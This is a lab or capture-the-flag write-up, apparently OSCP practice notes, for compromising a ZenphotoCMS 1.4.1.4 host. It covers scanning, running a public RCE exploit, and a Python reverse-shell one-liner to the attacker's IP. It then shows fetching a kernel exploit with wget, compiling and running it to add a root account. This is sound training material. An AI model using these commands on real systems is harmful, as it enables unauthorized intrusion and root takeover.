#### Enumeration

```
# Nmap 7.91 scan initiated Fri Jan 28 08:27:29 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/ZenPhoto/AutoRecon/results/192.168.247.41/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/ZenPhoto/AutoRecon/results/192.168.247.41/scans/xml/_full_tcp_nmap.xml 192.168.247.41
Warning: 192.168.247.41 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.247.41
Host is up, received user-set (0.28s latency).
Scanned at 2022-01-28 08:27:30 EST for 2034s
Not shown: 65526 closed ports
Reason: 65526 conn-refused
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIM3Qmxj/JapoH/Vg/pl8IAj0PTqw5Fj5rnhI+9Q0XT5tej5pHpUZoWTmbQKIwA7QBoTWtk4Hnonhkv5We43VXz0abBEvy3allgjf13cvxc96KX0bE7Bb8PhVCQJJBDTIz44koJhvFuSO/sauL9j+lzaUltVMR6/bZbigTINrV4nAAAAFQCvlVi2Us40FGWv8TILJYOR/LJvcwAAAIAHpp8VGuPUA5BowTa55myGr/lGs0xTFXbxFm0We4/D5v3L9kUVgv6MIVL4jweRmXFYvei7YZDGikoe6OjF9PFtSkKriEaGqav6hOER3tmtWChQfMlaNwiZfNJzKHBc4EqeCX4jpLLUxCZAEjwoE0koQRoFcbr+gywBNOQgtrfv+QAAAIA8v2C1COdjtNl4Bp3+XVLOkbYPIpedQXCgTLgRloa5wQZCaZimgE3+txqTQSb7Vp0B+LfjKdqcMFia8g9i+0YC+b69NimiFaZXU8euBoh/GXNo8K2vFHF3yznq6KNPG4+EW3WfaLGqJWkBJM2bb1nJ0YaJZhpOInv2Gsanh4CHOA==
|   2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7aKskCBM7hdQEibRza0Y1BAiJ0prjECzVow5/txHOHb+Ynokd1ByaBw5roKsOExD3h7d7VGjNVKNqSwB+SBHSRivJaEgCtiV3F/5Q1qdBpehE4zyv7whG9GKeALeNk05icqXCk9kveUsreZyqEqN+c9p3Ed29jTD+6Alc7mml/Zev0EQs7hFfX/kYiV6V4KnQuQ7HXe3kzbMA9WB3yxtp0saBB5zlu4eWGsvyvCibP41ce81LtwkJDSXTr0LwBNYgZOD07GWW//BkOuJvHtKbWPqBievO0yubQxGbz0r7vID3a5DQMj4ZTGrAQPCunaJkGlvZs2zftrUh/BMxQSFLw==
23/tcp    open     ipp     syn-ack     CUPS 1.4
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
80/tcp    open     http    syn-ack     Apache httpd 2.2.14 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
3306/tcp  open     mysql?  syn-ack
|_mysql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
17206/tcp filtered unknown no-response
18397/tcp filtered unknown no-response
61692/tcp filtered unknown no-response
62446/tcp filtered unknown no-response
65500/tcp filtered unknown no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 09:01:24 2022 -- 1 IP address (1 host up) scanned in 2035.44 seconds

```

Site at 80 port doesn't look like anything special, so we execute a directory traversal.

```
feroxbuster --url http://192.168.247.41 -w /usr/share/wordlists/dirb/common.txt
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_0h43m18s_001.png)

Browsing to the URL ```http://192.168.247.41/test/index.php``` we can know that the site is running ZenphotoCMS and version is 1.4.1.4.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h19m29s_002.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_1h20m29s_003.png)

We use this RCE [exploit](https://www.exploit-db.com/exploits/18083).

```
php 18083.php 192.168.227.41 /test/
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h13m44s_004.png)

#### Privilege Escalation

We need a fully funcational shell. Starting a new Listener.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.227",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_16h33m0s_005.png)

Running linpeas.sh script to check for privilege escalation. From the results, we can find that the kernel is an old version.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_17h50m31s_006.png)

I use this kernel [exploit](https://www.exploit-db.com/exploits/40839) to try to create a new root user.

```
cd /tmp
wget http://192.168.49.227/40839.c #download file from attacker's pc
gcc -pthread 40839.c -o 40839 -lcrypt
chmod +x 40839
./40839
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m15s_007.png)

Using SSH to log in, the account is ```firefart``` and the password is we entered when using the exploit.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ZenPhoto/ZenPhoto_2022.01.31_18h6m51s_008.png)
